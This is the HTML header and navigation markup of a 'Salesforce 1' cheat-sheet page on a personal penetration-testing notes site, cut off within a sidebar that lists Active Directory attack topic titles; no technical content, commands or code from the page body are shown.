
<!doctype html>
<html lang="en" class="no-js">
  <head>
    
      <meta charset="utf-8">
      <meta name="viewport" content="width=device-width,initial-scale=1">
      
      
      
        <link rel="canonical" href="https://jacobh.io/Methodologies/%F0%9F%98%8F%20Cheatsheets/DaForce/Salesforce%20-%201/">
      
      
        <link rel="prev" href="../../WebApp/">
      
      
        <link rel="next" href="../Salesforce%20-%202/">
      
      
      <link rel="icon" href="../../../../assets/favicon.ico">
      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.6.18">
    
    
      
        <title>Salesforce 1 - jacobh.io</title>
      
    
    
      <link rel="stylesheet" href="../../../../assets/stylesheets/main.7e37652d.min.css">
      
        
        <link rel="stylesheet" href="../../../../assets/stylesheets/palette.06af60db.min.css">
      
      


    
    
      
    
    
      
        
        
        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Ubuntu:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
        <style>:root{--md-text-font:"Ubuntu";--md-code-font:"Roboto Mono"}</style>
      
    
    
    <script>__md_scope=new URL("../../../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
    
      

    
    
      
        <meta  property="og:type"  content="website" >
      
        <meta  property="og:title"  content="Salesforce   1 - jacobh.io" >
      
        <meta  property="og:description"  content="None" >
      
        <meta  property="og:image"  content="https://jacobh.io/assets/images/social/Methodologies/ðŸ˜ Cheatsheets/DaForce/Salesforce - 1.png" >
      
        <meta  property="og:image:type"  content="image/png" >
      
        <meta  property="og:image:width"  content="1200" >
      
        <meta  property="og:image:height"  content="630" >
      
        <meta  property="og:url"  content="https://jacobh.io/Methodologies/%F0%9F%98%8F%20Cheatsheets/DaForce/Salesforce%20-%201/" >
      
        <meta  name="twitter:card"  content="summary_large_image" >
      
        <meta  name="twitter:title"  content="Salesforce   1 - jacobh.io" >
      
        <meta  name="twitter:description"  content="None" >
      
        <meta  name="twitter:image"  content="https://jacobh.io/assets/images/social/Methodologies/ðŸ˜ Cheatsheets/DaForce/Salesforce - 1.png" >
      
    
    
  </head>
  
  
    
    
      
    
    
    
    
    <body dir="ltr" data-md-color-scheme="slate" data-md-color-primary="black" data-md-color-accent="indigo">
  
    
    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
    <label class="md-overlay" for="__drawer"></label>
    <div data-md-component="skip">
      
        
        <a href="#table-of-contents" class="md-skip">
          Skip to content
        </a>
      
    </div>
    <div data-md-component="announce">
      
    </div>
    
    
      

<header class="md-header" data-md-component="header">
  <nav class="md-header__inner md-grid" aria-label="Header">
    <a href="../../../.." title="jacobh.io" class="md-header__button md-logo" aria-label="jacobh.io" data-md-component="logo">
      
  <img src="../../../../assets/favicon.ico" alt="logo">

    </a>
    <label class="md-header__button md-icon" for="__drawer">
      
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
    </label>
    <div class="md-header__title" data-md-component="header-title">
      <div class="md-header__ellipsis">
        <div class="md-header__topic">
          <span class="md-ellipsis">
            jacobh.io
          </span>
        </div>
        <div class="md-header__topic" data-md-component="header-topic">
          <span class="md-ellipsis">
            
              Salesforce   1
            
          </span>
        </div>
      </div>
    </div>
    
      
        <form class="md-header__option" data-md-component="palette">
  
    
    
    
    <input class="md-option" data-md-color-media="" data-md-color-scheme="slate" data-md-color-primary="black" data-md-color-accent="indigo"  aria-label="Switch to dark mode"  type="radio" name="__palette" id="__palette_0">
    
      <label class="md-header__button md-icon" title="Switch to dark mode" for="__palette_1" hidden>
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a4 4 0 0 0-4 4 4 4 0 0 0 4 4 4 4 0 0 0 4-4 4 4 0 0 0-4-4m0 10a6 6 0 0 1-6-6 6 6 0 0 1 6-6 6 6 0 0 1 6 6 6 6 0 0 1-6 6m8-9.31V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12z"/></svg>
      </label>
    
  
    
    
    
    <input class="md-option" data-md-color-media="" data-md-color-scheme="default" data-md-color-primary="black" data-md-color-accent="indigo"  aria-label="Switch to light mode"  type="radio" name="__palette" id="__palette_1">
    
      <label class="md-header__button md-icon" title="Switch to light mode" for="__palette_0" hidden>
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 18c-.89 0-1.74-.2-2.5-.55C11.56 16.5 13 14.42 13 12s-1.44-4.5-3.5-5.45C10.26 6.2 11.11 6 12 6a6 6 0 0 1 6 6 6 6 0 0 1-6 6m8-9.31V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12z"/></svg>
      </label>
    
  
</form>
      
    
    
      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
    
    
    
      
      
        <label class="md-header__button md-icon" for="__search">
          
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
        </label>
        <div class="md-search" data-md-component="search" role="dialog">
  <label class="md-search__overlay" for="__search"></label>
  <div class="md-search__inner" role="search">
    <form class="md-search__form" name="search">
      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
      <label class="md-search__icon md-icon" for="__search">
        
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
        
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
      </label>
      <nav class="md-search__options" aria-label="Search">
        
        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
          
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
        </button>
      </nav>
      
    </form>
    <div class="md-search__output">
      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
        <div class="md-search-result" data-md-component="search-result">
          <div class="md-search-result__meta">
            Initializing search
          </div>
          <ol class="md-search-result__list" role="presentation"></ol>
        </div>
      </div>
    </div>
  </div>
</div>
      
    
    
      <div class="md-header__source">
        <a href="https://github.com/Jacob-Ham/jacobhio" title="Go to repository" class="md-source" data-md-component="source">
  <div class="md-source__icon md-icon">
    
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 7.0.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path fill="currentColor" d="M439.6 236.1 244 40.5c-5.4-5.5-12.8-8.5-20.4-8.5s-15 3-20.4 8.4L162.5 81l51.5 51.5c27.1-9.1 52.7 16.8 43.4 43.7l49.7 49.7c34.2-11.8 61.2 31 35.5 56.7-26.5 26.5-70.2-2.9-56-37.3L240.3 199v121.9c25.3 12.5 22.3 41.8 9.1 55-6.4 6.4-15.2 10.1-24.3 10.1s-17.8-3.6-24.3-10.1c-17.6-17.6-11.1-46.9 11.2-56v-123c-20.8-8.5-24.6-30.7-18.6-45L142.6 101 8.5 235.1C3 240.6 0 247.9 0 255.5s3 15 8.5 20.4l195.6 195.7c5.4 5.4 12.7 8.4 20.4 8.4s15-3 20.4-8.4l194.7-194.7c5.4-5.4 8.4-12.8 8.4-20.4s-3-15-8.4-20.4"/></svg>
  </div>
  <div class="md-source__repository">
    Jacob-Ham/jacobhio
  </div>
</a>
      </div>
    
  </nav>
  
</header>
    
    <div class="md-container" data-md-component="container">
      
      
        
          
            
<nav class="md-tabs" aria-label="Tabs" data-md-component="tabs">
  <div class="md-grid">
    <ul class="md-tabs__list">
      
        
  
  
  
  
    <li class="md-tabs__item">
      <a href="../../../.." class="md-tabs__link">
        
  
  
    
  
  $ whoami

      </a>
    </li>
  

      
        
  
  
  
  
    <li class="md-tabs__item">
      <a href="../../../../setup/" class="md-tabs__link">
        
  
  
    
  
  Setup

      </a>
    </li>
  

      
        
  
  
  
  
    
    
      <li class="md-tabs__item">
        <a href="../../../../Active%20Directory/" class="md-tabs__link">
          
  
  
  Active Directory

        </a>
      </li>
    
  

      
        
  
  
  
  
    
    
      
  
  
  
  
    
    
      <li class="md-tabs__item">
        <a href="../../../../Cloud/Amazon%20Web%20Services%20%28AWS%29/Authenticate/" class="md-tabs__link">
          
  
  
  Cloud

        </a>
      </li>
    
  

    
  

      
        
  
  
  
    
  
  
    
    
      
  
  
  
    
  
  
    
    
      <li class="md-tabs__item md-tabs__item--active">
        <a href="../../../%E2%9C%85%20Checklists/Active%20Directory/" class="md-tabs__link">
          
  
  
  Methodologies

        </a>
      </li>
    
  

    
  

      
        
  
  
  
  
    
    
      <li class="md-tabs__item">
        <a href="../../../../Web%20Application/" class="md-tabs__link">
          
  
  
  Web Application

        </a>
      </li>
    
  

      
        
  
  
  
  
    
    
      <li class="md-tabs__item">
        <a href="../../../../writeups/" class="md-tabs__link">
          
  
  
  Writeups

        </a>
      </li>
    
  

      
    </ul>
  </div>
</nav>
          
        
      
      <main class="md-main" data-md-component="main">
        <div class="md-main__inner md-grid">
          
            
              
              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    


  


<nav class="md-nav md-nav--primary md-nav--lifted" aria-label="Navigation" data-md-level="0">
  <label class="md-nav__title" for="__drawer">
    <a href="../../../.." title="jacobh.io" class="md-nav__button md-logo" aria-label="jacobh.io" data-md-component="logo">
      
  <img src="../../../../assets/favicon.ico" alt="logo">

    </a>
    jacobh.io
  </label>
  
    <div class="md-nav__source">
      <a href="https://github.com/Jacob-Ham/jacobhio" title="Go to repository" class="md-source" data-md-component="source">
  <div class="md-source__icon md-icon">
    
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 7.0.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path fill="currentColor" d="M439.6 236.1 244 40.5c-5.4-5.5-12.8-8.5-20.4-8.5s-15 3-20.4 8.4L162.5 81l51.5 51.5c27.1-9.1 52.7 16.8 43.4 43.7l49.7 49.7c34.2-11.8 61.2 31 35.5 56.7-26.5 26.5-70.2-2.9-56-37.3L240.3 199v121.9c25.3 12.5 22.3 41.8 9.1 55-6.4 6.4-15.2 10.1-24.3 10.1s-17.8-3.6-24.3-10.1c-17.6-17.6-11.1-46.9 11.2-56v-123c-20.8-8.5-24.6-30.7-18.6-45L142.6 101 8.5 235.1C3 240.6 0 247.9 0 255.5s3 15 8.5 20.4l195.6 195.7c5.4 5.4 12.7 8.4 20.4 8.4s15-3 20.4-8.4l194.7-194.7c5.4-5.4 8.4-12.8 8.4-20.4s-3-15-8.4-20.4"/></svg>
  </div>
  <div class="md-source__repository">
    Jacob-Ham/jacobhio
  </div>
</a>
    </div>
  
  <ul class="md-nav__list" data-md-scrollfix>
    
      
      
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../.." class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    $ whoami
    
  </span>
  

      </a>
    </li>
  

    
      
      
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../../setup/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Setup
    
  </span>
  

      </a>
    </li>
  

    
      
      
  
  
  
  
    
    
    
    
      
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3" >
        
          
          <label class="md-nav__link" for="__nav_3" id="__nav_3_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    Active Directory
    
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_3">
            <span class="md-nav__icon md-icon"></span>
            Active Directory
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../../Active%20Directory/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Under Construction
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    
    
    
    
      
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_2" >
        
          
          <label class="md-nav__link" for="__nav_3_2" id="__nav_3_2_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    1. Reconnaissance & Enumeration
    
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_3_2_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_3_2">
            <span class="md-nav__icon md-icon"></span>
            1. Reconnaissance & Enumeration
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../../Active%20Directory/1.%20Reconnaissance%20%26%20Enumeration/Domain%20User%20Enumeration/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Domain User Enumeration
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../../Active%20Directory/1.%20Reconnaissance%20%26%20Enumeration/Domain%20Wide%20Enumeration/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Domain Wide Enumeration
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../../Active%20Directory/1.%20Reconnaissance%20%26%20Enumeration/Enumerating%20Security%20Controls/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Enumerating Security Controls
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../../Active%20Directory/1.%20Reconnaissance%20%26%20Enumeration/Group%20Membership/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Group Membership
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../../Active%20Directory/1.%20Reconnaissance%20%26%20Enumeration/Living%20Off%20the%20Land%20Enumeration/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Living Off the Land Enumeration
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../../Active%20Directory/1.%20Reconnaissance%20%26%20Enumeration/Password%20Policy%20Enumeration/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Password Policy Enumeration
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../../Active%20Directory/1.%20Reconnaissance%20%26%20Enumeration/Service%20Enumeration/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Service Enumeration
    
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
    
    
      
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_3" >
        
          
          <label class="md-nav__link" for="__nav_3_3" id="__nav_3_3_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    2. Initial Compromise
    
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_3_3_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_3_3">
            <span class="md-nav__icon md-icon"></span>
            2. Initial Compromise
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../../Active%20Directory/2.%20Initial%20Compromise/ASREPRoast/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    ASREPRoast
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../../Active%20Directory/2.%20Initial%20Compromise/IPv6%20Attacks/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    IPv6 Attacks
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../../Active%20Directory/2.%20Initial%20Compromise/LLMNR%20Poisoning/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    LLMNR Poisoning
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../../Active%20Directory/2.%20Initial%20Compromise/NTLM%20Hash%20Theft/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    NTLM Hash Theft
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../../Active%20Directory/2.%20Initial%20Compromise/Password%20Stuff/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Password Stuff
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../../Active%20Directory/2.%20Initial%20Compromise/Pre-Boot%20Execution%20Environment%20PXE/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Pre Boot Execution Environment PXE
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../../Active%20Directory/2.%20Initial%20Compromise/Relay%20Attacks/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Relay Attacks
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../../Active%20Directory/2.%20Initial%20Compromise/Word%20Doc%20Macro/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Word Doc Macro
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../../Active%20Directory/2.%20Initial%20Compromise/ZeroLogon/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    ZeroLogon
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../../Active%20Directory/2.%20Initial%20Compromise/%F0%9F%91%BB%20PrintNightmare/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    ðŸ‘» PrintNightmare
    
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
    
    
      
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_4" >
        
          
          <label class="md-nav__link" for="__nav_3_4" id="__nav_3_4_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    3. Credential Theft
    
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_3_4_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_3_4">
            <span class="md-nav__icon md-icon"></span>
            3. Credential Theft
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../../Active%20Directory/3.%20Credential%20Theft/Authentication%20Coercion/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Authentication Coercion
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../../Active%20Directory/3.%20Credential%20Theft/Credential%20Dumping/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Credential Dumping
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../../Active%20Directory/3.%20Credential%20Theft/Credential%20Hunting/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Credential Hunting
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../../Active%20Directory/3.%20Credential%20Theft/GPP%20Password/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    GPP Password
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../../Active%20Directory/3.%20Credential%20Theft/Hash%20Cracking/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Hash Cracking
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../../Active%20Directory/3.%20Credential%20Theft/Kerberoasting/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Kerberoasting
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../../Active%20Directory/3.%20Credential%20Theft/Unconstrained%20Delegation/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Unconstrained Delegation
    
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
    
    
      
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_5" >
        
          
          <label class="md-nav__link" for="__nav_3_5" id="__nav_3_5_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    4. Lateral Movement
    
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_3_5_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_3_5">
            <span class="md-nav__icon md-icon"></span>
            4. Lateral Movement
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../../Active%20Directory/4.%20Lateral%20Movement/Alternate%20Service%20Name/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Alternate Service Name
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../../Active%20Directory/4.%20Lateral%20Movement/Constrained%20Delegation/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Constrained Delegation
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../../Active%20Directory/4.%20Lateral%20Movement/Domain%20ACLs/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Domain ACLs
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../../Active%20Directory/4.%20Lateral%20Movement/Execution%20Methods/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Execution Methods
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../../Active%20Directory/4.%20Lateral%20Movement/Forest%20%26%20Domain%20Trusts/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Forest & Domain Trusts
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../../Active%20Directory/4.%20Lateral%20Movement/Group%20Policy%20Abuse/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Group Policy Abuse
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../../Active%20Directory/4.%20Lateral%20Movement/Kerberos%20Double%20Hop/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Kerberos Double Hop
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../../Active%20Directory/4.%20Lateral%20Movement/MSSQL%20Abuse/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    MSSQL Abuse
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../../Active%20Directory/4.%20Lateral%20Movement/Overpass%20The%20Hash/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Overpass The Hash
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../../Active%20Directory/4.%20Lateral%20Movement/Pass%20The%20Hash/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Pass The Hash
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../../Active%20Directory/4.%20Lateral%20Movement/Pass%20The%20Ticket/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Pass The Ticket
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../../Active%20Directory/4.%20Lateral%20Movement/Pivoting/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Pivoting
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../../Active%20Directory/4.%20Lateral%20Movement/Resource-Based%20Constrained%20Delegation/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Resource Based Constrained Delegation
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../../Active%20Directory/4.%20Lateral%20Movement/Service%20for%20User%20to%20Self/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Service for User to Self
    
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
    
    
      
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_6" >
        
          
          <label class="md-nav__link" for="__nav_3_6" id="__nav_3_6_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    5. Privilege Escalation
    
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_3_6_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_3_6">
            <span class="md-nav__icon md-icon"></span>
            5. Privilege Escalation
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    
    
    
    
      
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_6_1" >
        
          
          <label class="md-nav__link" for="__nav_3_6_1" id="__nav_3_6_1_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    Domain
    
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_3_6_1_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_3_6_1">
            <span class="md-nav__icon md-icon"></span>
            Domain
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../../Active%20Directory/5.%20Privilege%20Escalation/Domain/DCShadow/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    DCShadow
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../../Active%20Directory/5.%20Privilege%20Escalation/Domain/DCSync/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    DCSync
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../../Active%20Directory/5.%20Privilege%20Escalation/Domain/Diamond%20Ticket/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Diamond Ticket
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
